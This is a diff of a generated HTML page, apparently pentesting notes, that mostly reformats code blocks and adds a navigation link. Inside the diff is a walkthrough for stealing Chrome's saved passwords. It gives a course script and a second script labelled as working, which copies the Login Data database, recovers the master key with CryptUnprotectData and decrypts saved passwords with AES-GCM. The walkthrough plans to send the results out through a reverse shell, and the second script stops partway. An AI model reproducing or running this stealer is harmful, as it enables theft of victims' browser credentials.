@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17113,8 +17136,8 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 </details>
 <h2 id="how-does-chrome-saved-passwords-work">How does Chrome saved passwords work?</h2>
 <p>Chrome uses windows session password to encrypt and decrypt saved passwords. Encrypted passwords are stored  in a SQlite  db called 'Login Data DB' located at:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default
+</span></code></pre></div></td></tr></table></div>
 <p>Chrome calls to the windows API function called "CryptProtectData", which uses the windows login password as an encryption key and in reverse operation a windows API function called "CryptUnprotectData" to decrypt the password value back to clear text.</p>
 <p><strong>1.</strong> Install sqlite from: https://sqlitebrowser.org/dl/</p>
 <p><strong>2.</strong> Open DB Browser sqlite.</p>
@@ -17125,162 +17148,301 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <h2 id="our-script">Our script</h2>
 <p>The route map for this script will be:</p>
 <p><strong>1.</strong> Guessing the path to sqlite database: username and browser used by the victim.</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a>C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default
+</span></code></pre></div></td></tr></table></div>
 <p><strong>2.</strong> Sending the password value from a column in "logins" table, in "Login Data.sqlite3" to function CryptUn ProtectData.</p>
 <p><strong>3.</strong> Send the passwords through a reverse shell.</p>
 <h3 id="script-for-gathering-passwords">Script for gathering passwords</h3>
 <p>Here is the script provided in the course (it doesn't work, below I've pasted a different one that works):</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a><span class="c1"># Python For Offensive PenTest: A Complete Practical Course  - All rights reserved </span>
-</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a><span class="c1"># Follow me on LinkedIn  https://jo.linkedin.com/in/python2</span>
-</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>
-</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>
-</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">getenv</span> 
-</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6" href="#__codelineno-2-6"></a><span class="c1"># To find out the Chrome SQL path- C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data</span>
-</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7" href="#__codelineno-2-7"></a>
-</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8" href="#__codelineno-2-8"></a><span class="kn">import</span> <span class="nn">sqlite3</span> <span class="c1"># To read the Chrome SQLite DB</span>
-</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9" href="#__codelineno-2-9"></a>
-</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a><span class="kn">import</span> <span class="nn">win32crypt</span>  <span class="c1"># High level library to call windows API CryptUnprotectData</span>
-</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>
-</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a><span class="kn">from</span> <span class="nn">shutil</span> <span class="kn">import</span> <span class="n">copyfile</span> <span class="c1"># To make a copy of the Chrome SQLite DB</span>
-</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>
-</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>
-</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a><span class="c1"># LOCALAPPDATA is a Windows Environment Variable which points to &gt;&gt;&gt; C:\Users\{username}\AppData\Local</span>
-</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a><span class="n">path</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;LOCALAPPDATA&quot;</span><span class="p">)</span><span class="o">+</span><span class="sa">r</span><span class="s2">&quot;\Google\Chrome\User Data\Default\Login Data&quot;</span>
-</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>
-</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a><span class="c1"># make a copy the Login Data DB and pull data out of the copied DB, so there are no conflicts in case that the user is using the original (maybe she is logged into facebook, let&#39;s say)</span>
-</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a><span class="n">path2</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;LOCALAPPDATA&quot;</span><span class="p">)</span><span class="o">+</span><span class="sa">r</span><span class="s2">&quot;\Google\Chrome\User Data\Default\Login2&quot;</span>
-</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a><span class="n">copyfile</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">path2</span><span class="p">)</span>
-</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>
-</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a><span class="c1"># Connect to the copied Database</span>
-</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a><span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">path2</span><span class="p">)</span>
-</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>
-</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>
-</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a><span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span> <span class="c1">#Create a Cursor object and call its execute() method to perform SQL commands like SELECT</span>
-</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a>
-</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a><span class="c1"># SELECT column_name,column_name FROM table_name</span>
-</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a><span class="c1"># SELECT action_url and username_value and password_value FROM table logins</span>
-</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a><span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;SELECT action_url, username_value, password_value FROM logins&#39;</span><span class="p">)</span>
-</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a>
-</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32" href="#__codelineno-2-32"></a>
-</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33" href="#__codelineno-2-33"></a><span class="c1"># To retrieve data after executing a SELECT statement, we call fetchall() to get a list of the matching rows.</span>
-</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34" href="#__codelineno-2-34"></a><span class="k">for</span> <span class="n">raw</span> <span class="ow">in</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">():</span>
-</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35" href="#__codelineno-2-35"></a>
-</span><span id="__span-2-36"><a id="__codelineno-2-36" name="__codelineno-2-36" href="#__codelineno-2-36"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">raw</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">raw</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="c1"># print the action_url (raw[0]) and print the username_value (raw[1])</span>
-</span><span id="__span-2-37"><a id="__codelineno-2-37" name="__codelineno-2-37" href="#__codelineno-2-37"></a>
-</span><span id="__span-2-38"><a id="__codelineno-2-38" name="__codelineno-2-38" href="#__codelineno-2-38"></a>    <span class="n">password</span> <span class="o">=</span> <span class="n">win32crypt</span><span class="o">.</span><span class="n">CryptUnprotectData</span><span class="p">(</span><span class="n">raw</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># pass the encrypted Password to CryptUnprotectData API function to decrypt it  </span>
-</span><span id="__span-2-39"><a id="__codelineno-2-39" name="__codelineno-2-39" href="#__codelineno-2-39"></a>
-</span><span id="__span-2-40"><a id="__codelineno-2-40" name="__codelineno-2-40" href="#__codelineno-2-40"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
-</span><span id="__span-2-41"><a id="__codelineno-2-41" name="__codelineno-2-41" href="#__codelineno-2-41"></a><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-</span></code></pre></div>
+<div class="language-python highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1"> 1</a></span>
+<span class="normal"><a href="#__codelineno-2-2"> 2</a></span>
+<span class="normal"><a href="#__codelineno-2-3"> 3</a></span>
+<span class="normal"><a href="#__codelineno-2-4"> 4</a></span>
+<span class="normal"><a href="#__codelineno-2-5"> 5</a></span>
+<span class="normal"><a href="#__codelineno-2-6"> 6</a></span>
+<span class="normal"><a href="#__codelineno-2-7"> 7</a></span>
+<span class="normal"><a href="#__codelineno-2-8"> 8</a></span>
+<span class="normal"><a href="#__codelineno-2-9"> 9</a></span>
+<span class="normal"><a href="#__codelineno-2-10">10</a></span>
+<span class="normal"><a href="#__codelineno-2-11">11</a></span>
+<span class="normal"><a href="#__codelineno-2-12">12</a></span>
+<span class="normal"><a href="#__codelineno-2-13">13</a></span>
+<span class="normal"><a href="#__codelineno-2-14">14</a></span>
+<span class="normal"><a href="#__codelineno-2-15">15</a></span>
+<span class="normal"><a href="#__codelineno-2-16">16</a></span>
+<span class="normal"><a href="#__codelineno-2-17">17</a></span>
+<span class="normal"><a href="#__codelineno-2-18">18</a></span>
+<span class="normal"><a href="#__codelineno-2-19">19</a></span>
+<span class="normal"><a href="#__codelineno-2-20">20</a></span>
+<span class="normal"><a href="#__codelineno-2-21">21</a></span>
+<span class="normal"><a href="#__codelineno-2-22">22</a></span>
+<span class="normal"><a href="#__codelineno-2-23">23</a></span>
+<span class="normal"><a href="#__codelineno-2-24">24</a></span>
+<span class="normal"><a href="#__codelineno-2-25">25</a></span>
+<span class="normal"><a href="#__codelineno-2-26">26</a></span>
+<span class="normal"><a href="#__codelineno-2-27">27</a></span>
+<span class="normal"><a href="#__codelineno-2-28">28</a></span>
+<span class="normal"><a href="#__codelineno-2-29">29</a></span>
+<span class="normal"><a href="#__codelineno-2-30">30</a></span>
+<span class="normal"><a href="#__codelineno-2-31">31</a></span>
+<span class="normal"><a href="#__codelineno-2-32">32</a></span>
+<span class="normal"><a href="#__codelineno-2-33">33</a></span>
+<span class="normal"><a href="#__codelineno-2-34">34</a></span>
+<span class="normal"><a href="#__codelineno-2-35">35</a></span>
+<span class="normal"><a href="#__codelineno-2-36">36</a></span>
+<span class="normal"><a href="#__codelineno-2-37">37</a></span>
+<span class="normal"><a href="#__codelineno-2-38">38</a></span>
+<span class="normal"><a href="#__codelineno-2-39">39</a></span>
+<span class="normal"><a href="#__codelineno-2-40">40</a></span>
+<span class="normal"><a href="#__codelineno-2-41">41</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a><span class="c1"># Python For Offensive PenTest: A Complete Practical Course  - All rights reserved </span>
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2"></a><span class="c1"># Follow me on LinkedIn  https://jo.linkedin.com/in/python2</span>
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3"></a>
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4"></a>
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5"></a><span class="kn">from</span> <span class="nn">os</span> <span class="kn">import</span> <span class="n">getenv</span> 
+</span><span id="__span-2-6"><a id="__codelineno-2-6" name="__codelineno-2-6"></a><span class="c1"># To find out the Chrome SQL path- C:\Users\%USERNAME%\AppData\Local\Google\Chrome\User Data\Default\Login Data</span>
+</span><span id="__span-2-7"><a id="__codelineno-2-7" name="__codelineno-2-7"></a>
+</span><span id="__span-2-8"><a id="__codelineno-2-8" name="__codelineno-2-8"></a><span class="kn">import</span> <span class="nn">sqlite3</span> <span class="c1"># To read the Chrome SQLite DB</span>
+</span><span id="__span-2-9"><a id="__codelineno-2-9" name="__codelineno-2-9"></a>
+</span><span id="__span-2-10"><a id="__codelineno-2-10" name="__codelineno-2-10"></a><span class="kn">import</span> <span class="nn">win32crypt</span>  <span class="c1"># High level library to call windows API CryptUnprotectData</span>
+</span><span id="__span-2-11"><a id="__codelineno-2-11" name="__codelineno-2-11"></a>
+</span><span id="__span-2-12"><a id="__codelineno-2-12" name="__codelineno-2-12"></a><span class="kn">from</span> <span class="nn">shutil</span> <span class="kn">import</span> <span class="n">copyfile</span> <span class="c1"># To make a copy of the Chrome SQLite DB</span>
+</span><span id="__span-2-13"><a id="__codelineno-2-13" name="__codelineno-2-13"></a>
+</span><span id="__span-2-14"><a id="__codelineno-2-14" name="__codelineno-2-14"></a>
+</span><span id="__span-2-15"><a id="__codelineno-2-15" name="__codelineno-2-15"></a><span class="c1"># LOCALAPPDATA is a Windows Environment Variable which points to &gt;&gt;&gt; C:\Users\{username}\AppData\Local</span>
+</span><span id="__span-2-16"><a id="__codelineno-2-16" name="__codelineno-2-16"></a><span class="n">path</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;LOCALAPPDATA&quot;</span><span class="p">)</span><span class="o">+</span><span class="sa">r</span><span class="s2">&quot;\Google\Chrome\User Data\Default\Login Data&quot;</span>
+</span><span id="__span-2-17"><a id="__codelineno-2-17" name="__codelineno-2-17"></a>
+</span><span id="__span-2-18"><a id="__codelineno-2-18" name="__codelineno-2-18"></a><span class="c1"># make a copy the Login Data DB and pull data out of the copied DB, so there are no conflicts in case that the user is using the original (maybe she is logged into facebook, let&#39;s say)</span>
+</span><span id="__span-2-19"><a id="__codelineno-2-19" name="__codelineno-2-19"></a><span class="n">path2</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s2">&quot;LOCALAPPDATA&quot;</span><span class="p">)</span><span class="o">+</span><span class="sa">r</span><span class="s2">&quot;\Google\Chrome\User Data\Default\Login2&quot;</span>
+</span><span id="__span-2-20"><a id="__codelineno-2-20" name="__codelineno-2-20"></a><span class="n">copyfile</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">path2</span><span class="p">)</span>
+</span><span id="__span-2-21"><a id="__codelineno-2-21" name="__codelineno-2-21"></a>
+</span><span id="__span-2-22"><a id="__codelineno-2-22" name="__codelineno-2-22"></a><span class="c1"># Connect to the copied Database</span>
+</span><span id="__span-2-23"><a id="__codelineno-2-23" name="__codelineno-2-23"></a><span class="n">conn</span> <span class="o">=</span> <span class="n">sqlite3</span><span class="o">.</span><span class="n">connect</span><span class="p">(</span><span class="n">path2</span><span class="p">)</span>
+</span><span id="__span-2-24"><a id="__codelineno-2-24" name="__codelineno-2-24"></a>
+</span><span id="__span-2-25"><a id="__codelineno-2-25" name="__codelineno-2-25"></a>
+</span><span id="__span-2-26"><a id="__codelineno-2-26" name="__codelineno-2-26"></a><span class="n">cursor</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">cursor</span><span class="p">()</span> <span class="c1">#Create a Cursor object and call its execute() method to perform SQL commands like SELECT</span>
+</span><span id="__span-2-27"><a id="__codelineno-2-27" name="__codelineno-2-27"></a>
+</span><span id="__span-2-28"><a id="__codelineno-2-28" name="__codelineno-2-28"></a><span class="c1"># SELECT column_name,column_name FROM table_name</span>
+</span><span id="__span-2-29"><a id="__codelineno-2-29" name="__codelineno-2-29"></a><span class="c1"># SELECT action_url and username_value and password_value FROM table logins</span>
+</span><span id="__span-2-30"><a id="__codelineno-2-30" name="__codelineno-2-30"></a><span class="n">cursor</span><span class="o">.</span><span class="n">execute</span><span class="p">(</span><span class="s1">&#39;SELECT action_url, username_value, password_value FROM logins&#39;</span><span class="p">)</span>
+</span><span id="__span-2-31"><a id="__codelineno-2-31" name="__codelineno-2-31"></a>
+</span><span id="__span-2-32"><a id="__codelineno-2-32" name="__codelineno-2-32"></a>
+</span><span id="__span-2-33"><a id="__codelineno-2-33" name="__codelineno-2-33"></a><span class="c1"># To retrieve data after executing a SELECT statement, we call fetchall() to get a list of the matching rows.</span>
+</span><span id="__span-2-34"><a id="__codelineno-2-34" name="__codelineno-2-34"></a><span class="k">for</span> <span class="n">raw</span> <span class="ow">in</span> <span class="n">cursor</span><span class="o">.</span><span class="n">fetchall</span><span class="p">():</span>
+</span><span id="__span-2-35"><a id="__codelineno-2-35" name="__codelineno-2-35"></a>
+</span><span id="__span-2-36"><a id="__codelineno-2-36" name="__codelineno-2-36"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">raw</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">+</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span> <span class="o">+</span> <span class="n">raw</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="c1"># print the action_url (raw[0]) and print the username_value (raw[1])</span>
+</span><span id="__span-2-37"><a id="__codelineno-2-37" name="__codelineno-2-37"></a>
+</span><span id="__span-2-38"><a id="__codelineno-2-38" name="__codelineno-2-38"></a>    <span class="n">password</span> <span class="o">=</span> <span class="n">win32crypt</span><span class="o">.</span><span class="n">CryptUnprotectData</span><span class="p">(</span><span class="n">raw</span><span class="p">[</span><span class="mi">2</span><span class="p">])[</span><span class="mi">1</span><span class="p">]</span> <span class="c1"># pass the encrypted Password to CryptUnprotectData API function to decrypt it  </span>
+</span><span id="__span-2-39"><a id="__codelineno-2-39" name="__codelineno-2-39"></a>
+</span><span id="__span-2-40"><a id="__codelineno-2-40" name="__codelineno-2-40"></a>    <span class="nb">print</span><span class="p">(</span><span class="n">password</span><span class="p">)</span>
+</span><span id="__span-2-41"><a id="__codelineno-2-41" name="__codelineno-2-41"></a><span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></code></pre></div></td></tr></table></div>
 <p>Script that works. These are requirements:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>pip install PyCryptodome
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a>pip install PyCryptodome
+</span></code></pre></div></td></tr></table></div>
 <p>Script:</p>
-<div class="language-python highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="kn">import</span> <span class="nn">os</span>
-</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="kn">import</span> <span class="nn">json</span>
-</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a><span class="kn">import</span> <span class="nn">base64</span>
-</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="kn">import</span> <span class="nn">sqlite3</span>
-</span><span id="__span-4-5"><a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a><span class="kn">import</span> <span class="nn">win32crypt</span>
-</span><span id="__span-4-6"><a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">AES</span>
-</span><span id="__span-4-7"><a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a><span class="kn">import</span> <span class="nn">shutil</span>
-</span><span id="__span-4-8"><a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a>
-</span><span id="__span-4-9"><a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a><span class="k">def</span> <span class="nf">get_master_key</span><span class="p">():</span>
-</span><span id="__span-4-10"><a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a>    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">environ</span><span class="p">[</span><span class="s1">&#39;USERPROFILE&#39;</span><span class="p">]</span> <span class="o">+</span> <span class="n">os</span><span class="o">.</span><span class="n">sep</span> <span class="o">+</span> <span class="sa">r</span><span class="s1">&#39;AppData\Local\Google\Chrome\User Data\Local State&#39;</span><span class="p">,</span> <span class="s2">&quot;r&quot;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-</span><span id="__span-4-11"><a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a>        <span class="n">local_state</span> <span class="o">=</span> <span class="n">f</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
-</span><span id="__span-4-12"><a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>        <span class="n">local_state</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">local_state</span><span class="p">)</span>
-</span><span id="__span-4-13"><a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a>    <span class="n">master_key</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">b64decode</span><span class="p">(</span><span class="n">local_state</span><span class="p">[</span><span class="s2">&quot;os_crypt&quot;</span><span class="p">][</span><span class="s2">&quot;encrypted_key&quot;</span><span class="p">])</span>
-</span><span id="__span-4-14"><a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>    <span class="n">master_key</span> <span class="o">=</span> <span class="n">master_key</span><span class="p">[</span><span class="mi">5</span><span class="p">:]</span>  <span class="c1"># removing DPAPI</span>
-</span><span id="__span-4-15"><a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a>    <span class="n">master_key</span> <span class="o">=</span> <span class="n">win32crypt</span><span class="o">.</span><span class="n">CryptUnprotectData</span><span class="p">(</span><span class="n">master_key</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="kc">None</span><span class="p">,</span> <span class="mi">0</span><span class="p">)[</span><span class="mi">1</span><span class="p">]</span>
-</span><span id="__span-4-16"><a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a>    <span class="k">return</span> <span class="n">master_key</span>
-</span><span id="__span-4-17"><a id="__codelineno-4-17" name="__codelineno-4-17" href="#__codelineno-4-17"></a>
-</span><span id="__span-4-18"><a id="__codelineno-4-18" name="__codelineno-4-18" href="#__codelineno-4-18"></a><span class="k">def</span> <span class="nf">decrypt_payload</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span> <span class="n">payload</span><span class="p">):</span>
-</span><span id="__span-4-19"><a id="__codelineno-4-19" name="__codelineno-4-19" href="#__codelineno-4-19"></a>    <span class="k">return</span> <span class="n">cipher</span><span class="o">.</span><span class="n">decrypt</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
-</span><span id="__span-4-20"><a id="__codelineno-4-20" name="__codelineno-4-20" href="#__codelineno-4-20"></a>
-</span><span id="__span-4-21"><a id="__codelineno-4-21" name="__codelineno-4-21" href="#__codelineno-4-21"></a><span class="k">def</span> <span class="nf">generate_cipher</span><span class="p">(</span><span class="n">aes_key</span><span class="p">,</span> <span class="n">iv</span><span class="p">):</span>
-</span><span id="__span-4-22"><a id="__codelineno-4-22" name="__codelineno-4-22" href="#__codelineno-4-22"></a>    <span class="k">return</span> <span class="n">AES</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">aes_key</span><span class="p">,</span> <span class="n">AES</span><span class="o">.</span><span class="n">MODE_GCM</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
-</span><span id="__span-4-23"><a id="__codelineno-4-23" name="__codelineno-4-23" href="#__codelineno-4-23"></a>
-</span><span id="__span-4-24"><a id="__codelineno-4-24" name="__codelineno-4-24" href="#__codelineno-4-24"></a><span class="k">def</span> <span class="nf">decrypt_password</span><span class="p">(</span><span class="n">buff</span><span class="p">,</span> <span class="n">master_key</span><span class="p">):</span>
-</span><span id="__span-4-25"><a id="__codelineno-4-25" name="__codelineno-4-25" href="#__codelineno-4-25"></a>    <span class="k">try</span><span class="p">:</span>
-</span><span id="__span-4-26"><a id="__codelineno-4-26" name="__codelineno-4-26" href="#__codelineno-4-26"></a>        <span class="n">iv</span> <span class="o">=</span> <span class="n">buff</span><span class="p">[</span><span class="mi">3</span><span class="p">:</span><span class="mi">15</span><span class="p">]</span>
-</span><span id="__span-4-27"><a id="__codelineno-4-27" name="__codelineno-4-27" href="#__codelineno-4-27"></a>        <span class="n">payload</span> <span class="o">=</span> <span class="n">buff</span><span class="p">[</span><span class="mi">15</span><span class="p">:]</span>
-</span><span id="__span-4-28"><a id="__codelineno-4-28" name="__codelineno-4-28" href="#__codelineno-4-28"></a>        <span class="n">cipher</span> <span class="o">=</span> <span class="n">generate_cipher</span><span class="p">(</span><span class="n">master_key</span><span class="p">,</span> <span class="n">iv</span><span class="p">)</span>
-</span><span id="__span-4-29"><a id="__codelineno-4-29" name="__codelineno-4-29" href="#__codelineno-4-29"></a>        <span class="n">decrypted_pass</span> <span class="o">=</span> <span class="n">decrypt_payload</span><span class="p">(</span><span class="n">cipher</span><span class="p">,</span> <span class="n">payload</span><span class="p">)</span>
-</span><span id="__span-4-30"><a id="__codelineno-4-30" name="__codelineno-4-30" href="#__codelineno-4-30"></a>        <span class="n">decrypted_pass</span> <span class="o">=</span> <span class="n">decrypted_pass</span><span class="p">[:</span><span class="o">-</span><span class="mi">16</span><span class="p">]</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>  <span class="c1"># remove suffix bytes</span>
-</span><span id="__span-4-31"><a id="__codelineno-4-31" name="__codelineno-4-31" href="#__codelineno-4-31"></a>        <span class="k">return</span> <span class="n">decrypted_pass</span>
-</span><span id="__span-4-32"><a id="__codelineno-4-32" name="__codelineno-4-32" href="#__codelineno-4-32"></a>    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-</span><span id="__span-4-33"><a id="__codelineno-4-33" name="__codelineno-4-33" href="#__codelineno-4-33"></a>        <span class="c1"># print(&quot;Probably saved password from Chrome version older than v80\n&quot;)</span>
-</span><span id="__span-4-34"><a id="__codelineno-4-34" name="__codelineno-4-34" href="#__codelineno-4-34"></a>        <span class="c1"># print(str(e))</span>
-</span><span id="__span-4-35"><a id="__codelineno-4-35" name="__codelineno-4-35" href="#__codelineno-4-35"></a>        <span class="k">return</span> <span class="s2">&quot;Chrome &lt; 80&quot;</span>
-</span><span id="__span-4-36"><a id="__codelineno-4-36" name="__codelineno-4-36" href="#__codelineno-4-36"></a>
-</span><span id="__span-4-37"><a id="__codelineno-4-37" name="__codelineno-4-37" href="#__codelineno-4-37"></a>
